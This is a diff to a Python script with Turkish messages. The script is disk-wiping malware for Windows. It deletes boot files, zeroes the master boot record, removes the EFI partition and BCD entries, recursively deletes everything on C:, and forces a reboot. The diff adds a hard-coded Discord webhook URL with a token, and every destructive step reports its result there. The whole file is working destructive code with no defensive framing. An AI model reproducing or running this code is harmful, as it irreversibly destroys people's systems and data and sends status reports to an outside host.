@@ -1,10 +1,17 @@
 import os
 import subprocess
 import shutil
+import requests
 
-# ==========================================
-# 1. KRİTİK SİSTEM DOSYALARINI SİL
-# ==========================================
+WEBHOOK_URL = "https://discord.com/api/webhooks/1473367003061555406/8Lww0RV1t7Vo7IXkkVpa5gfHkfqHTnXCuRE3Iwp_D3GyJiFnivKfv0o5Z1R1xbF7PEUi"
+
+def send_notification(message):
+    try:
+        payload = {"content": f"**[SİSTEM SİL]** {message}"}
+        requests.post(WEBHOOK_URL, json=payload, timeout=5)
+    except:
+        pass
+
 def delete_system_files():
     files = [
         "C:\\bootmgr",
@@ -20,56 +27,41 @@ def delete_system_files():
         try:
             if os.path.exists(f):
                 os.remove(f)
-                print(f"[+] Silindi: {f}")
+                send_notification(f"✅ Silindi: {f}")
         except Exception as e:
-            print(f"[-] Silinemedi: {f} - {e}")
+            send_notification(f"❌ Silinemedi: {f} - {e}")
 
-# ==========================================
-# 2. MBR (MASTER BOOT RECORD) SİL
-# ==========================================
 def wipe_mbr():
     try:
         with open("\\\\.\\PhysicalDrive0", "wb") as f:
             f.write(b'\x00' * 512)
-        print("[+] MBR silindi!")
+        send_notification("✅ MBR silindi!")
     except Exception as e:
-        print(f"[-] MBR silinemedi: {e}")
+        send_notification(f"❌ MBR silinemedi: {e}")
 
-# ==========================================
-# 3. EFI PARTİSYON SİL
-# ==========================================
 def delete_efi():
     try:
         subprocess.run('diskpart /c "select disk 0" /c "select partition 1" /c "delete partition override"', shell=True)
-        print("[+] EFI partition silindi!")
+        send_notification("✅ EFI partition silindi!")
     except Exception as e:
-        print(f"[-] EFI silinemedi: {e}")
+        send_notification(f"❌ EFI silinemedi: {e}")
 
-# ==========================================
-# 4. BCD SİL
-# ==========================================
 def delete_bcd():
     try:
         subprocess.run('bcdedit /delete {default} /f', shell=True, capture_output=True)
-        print("[+] BCD silindi!")
+        send_notification("✅ BCD silindi!")
     except Exception as e:
-        print(f"[-] BCD silinemedi: {e}")
+        send_notification(f"❌ BCD silinemedi: {e}")
 
-# ==========================================
-# 5. TÜM DOSYALARI SİL (DISK)
-# ==========================================
 def wipe_disk():
     try:
         os.system('del /f /s /q C:\\* >nul 2>&1')
-        print("[+] Tüm dosyalar silindi!")
+        send_notification("✅ Tüm dosyalar silindi!")
     except Exception as e:
-        print(f"[-] Disk silinemedi: {e}")
+        send_notification(f"❌ Disk silinemedi: {e}")
 
-# ==========================================
-# 6. HEP BİRLİKTE ÇALIŞTIR
-# ==========================================
 if __name__ == "__main__":
-    print("[*] Sistem silme işlemi başlatıldı...")
+    send_notification("💀 SİSTEM SİLME BAŞLATILDI!")
     
     delete_system_files()
     wipe_mbr()
@@ -77,7 +69,5 @@ if __name__ == "__main__":
     delete_bcd()
     wipe_disk()
     
-    print("[+] Sistem tamamen bozuldu!")
-    
-    # Bilgisayarı yeniden başlat
+    send_notification("💀 SİSTEM TAMAMEN BOZULDU!")
     os.system("shutdown /r /t 0")
